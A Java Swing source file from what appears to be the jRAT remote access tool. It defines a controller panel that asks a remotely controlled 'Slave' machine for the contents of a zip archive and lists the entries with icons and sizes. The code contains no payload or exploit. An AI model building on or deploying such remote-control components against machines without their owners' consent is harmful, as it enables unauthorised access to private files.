package jrat.module.fs.ui.previews;

import iconlib.FileIconUtils;
import iconlib.IconUtils;
import jrat.api.Resources;
import jrat.common.utils.DataUnits;
import jrat.controller.Slave;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.module.fs.packets.Packet63PreviewArchive;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.zip.ZipEntry;


@SuppressWarnings("serial")
public class PanelPreviewArchive extends PreviewPanel<ZipEntry> {

	private JTable table;
	private TableModel model;
	private String file;

	public PanelPreviewArchive(Slave s, String f) {
		super(s, "Archive Preview - " + f, Resources.getIcon("archive"));

		this.file = f;
		setBorder(new EmptyBorder(5, 5, 5, 5));

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(IconUtils.getIcon("update"));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				reload();
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(IconUtils.getIcon("clear"));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
			}
		});

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		table = new DefaultJTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return Icon.class;
				}
				return super.getColumnClass(column);
			}
		};
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { " ", "File name", "Size" }) {
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		});
		table.getColumnModel().getColumn(0).setPreferredWidth(30);
		table.getColumnModel().getColumn(1).setPreferredWidth(273);
		table.getColumnModel().getColumn(2).setPreferredWidth(104);
		table.setRowHeight(30);
		scrollPane.setViewportView(table);
		GroupLayout gl_contentPane = new GroupLayout(this);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addGap(8).addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 234, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addGap(5)));
		setLayout(gl_contentPane);
		reload();
	}

    /**
     * Add a zip entry to the table
     */
	public void addData(ZipEntry entry) {
	    String name = entry.getName();
        String size = "";

        if (!entry.isDirectory()) {
            size = DataUnits.getAsString(entry.getSize());
        }

        Icon icon = FileIconUtils.getIconFromExtension(name, entry.isDirectory());

        model.addRow(new Object[] { icon, name, size });
    }

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}

	public void reload() {
		slave.addToSendQueue(new Packet63PreviewArchive(file));
	}
}
